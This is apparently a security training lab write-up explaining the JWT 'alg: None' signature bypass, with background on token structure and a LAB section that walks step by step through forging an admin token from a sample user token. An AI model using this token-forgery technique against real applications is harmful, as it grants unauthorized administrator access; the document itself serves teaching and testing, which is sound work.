
# JSON Web Token

* This exercise covers the exploitation of a signature weakness in a `JWT` library.

## Introduction

* This course details the exploitation of a weakness in JSON Web Token (JWT). In this application, JWT is used for authentication. Upon successful login, the user is issued a JWT in a cookie.

* If you feel confident, you can try to do this exercise without following the course; then you can come back to the course to read some details and tips. If you want to do it by yourself, you can follow the following steps:

	* Create one user.

	* Inspect the token.

	* Tamper the token to gain `admin` access.

## JSON Web Token

* JSON Web Tokens are a storage mechanism for data. JWT can provide the following security mechanisms:

	* Encryption.

	* Signature.

* JWT follow the following pattern:

	* `Base64(Header).Base64(Data).Base64(Signature)`

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
.
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022
}
.
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret
)
```

* The `header` contains information on the security mechanisms used. 

* For example, the following header: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9` contains the following information:
```json
{ "alg": "HS256", 
  "typ": "JWS"}
```

* The header is `signed` . However, it's a catch 22 problem: if you want to sign the header, you will need the header to verify the signature and the signature to verify the header. 

* Signing the header doesn't prevent an attacker to tamper with the header and change the algorithm used for the signature. However, the server will still verify the signature (and therefore the content of the header).

## The vulnerability

* This issue was originally discussed in the following blog post: [`https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/`](https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/).

* In this article, Tim McLean discussed multiple issues in the signature mechanism used by JWT. In this exercise, we are going to focus on the first issue.

* Multiple signature methods can be used to ensure the integrity of JWT:
	
	* RSA based

	* Elliptic curves

	* HMAC

	* None

* Like SSL (with the NULL Cipher), JWT support a `None` algorithm for signature. This was probably introduced to debug applications. However, this can have a severe impact on the security of the application.

## Exploitation

* To exploit this vulnerability, you just need to decode the JWT and change the algorithm used for the signature. 

* Then you can submit your new JWT. However, this won't work unless you remove the signature. If you think like a developer, it actually makes a lot of sense. 

* If you had to develop a JWT library, you will start by generating all the signatures you need to support as it allows you to compare your implementation to others. Then you will create a generic verification method that compare what you get from the JWT with the signature you are generating (based on the algorithm in the header). 

* Since you don't generate any signature with the `None` algorithm, you will ensure that the signature is empty. Therefore, as an attacker, you need to provide an empty signature.

## Conclusion

* This exercise showed you how you can tamper with a JWT to gain administrator access in the application. It showed you that having a signed value is only as strong as the weakest algorithm used if an attacker can pick what algorithm is used.

### LAB

* you will be issued JWT token : `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlaiIsImlhdCI6IjE1NzUxNTk0NzIifQ.OGIzNzE3MDM2OTM5ZDFmYTQwMjlkZWMwODhkZTgxZjY4ZDAxYWY0MjhlNTU3NTE5MTBiZWMzNGVmN2M2M2E4ZQ`

* After decoding the strings between `.` with `Base64` : `{"alg":"HS256","typ":"JWS"}.{"login":"tej","iat":"1575159472"fQ.8b3717036939d1fa4029dec088de81f68d01af428e55751910bec34ef7c63a8ZQ`

* For proper decoding add `==` at the end of `eyJsb2dpbiI6InRlaiIsImlhdCI6IjE1NzUxNTk0NzIifQ`

* `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXUyJ9.eyJsb2dpbiI6InRlaiIsImlhdCI6IjE1NzUxNTk0NzIifQ==.OGIzNzE3MDM2OTM5ZDFmYTQwMjlkZWMwODhkZTgxZjY4ZDAxYWY0MjhlNTU3NTE5MTBiZWMzNGVmN2M2M2E4ZQ` and decode it to get `{"alg":"HS256","typ":"JWS"}.{"login":"tej","iat":"1575159472"}.8b3717036939d1fa4029dec088de81f68d01af428e55751910bec34ef7c63a8ZQ`

* Change the `alg` to `None` and remove signature part(after encoding) as we are using `None` as signature algorithm.

* `{"alg":"None","typ":"JWS"}.{"login":"admin","iat":"1575159472"}.8b3717036939d1fa4029dec088de81f68d01af428e55751910bec34ef7c63a8ZQ` then base64 enoded it to get `eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0=.eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTU3NTE1OTQ3MiJ9.OGIzNzE3MDM2OTM5ZDFmYTQwMjlkZWMwODhkZTgxZjY4ZDAxYWY0MjhlNTU3NTE5MTBiZWMzNGVmN2M2M2E4WlE=`

* remove the signature part `eyJhbGciOiJOb25lIiwidHlwIjoiSldTIn0=.eyJsb2dpbiI6ImFkbWluIiwiaWF0IjoiMTU3NTE1OTQ3MiJ9.`
